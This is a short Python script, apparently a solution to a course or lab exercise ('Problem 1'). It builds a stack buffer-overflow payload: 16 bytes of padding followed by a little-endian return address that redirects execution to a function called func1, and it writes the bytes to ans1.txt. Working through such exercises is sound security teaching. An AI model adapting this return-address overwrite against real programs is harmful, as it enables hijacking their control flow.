# target address of func1: 0x401216
# padding: 8 (buffer) + 8 (rbp) = 16 bytes

padding = b"A" * 16
target_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload for Problem 1 generated in ans1.txt")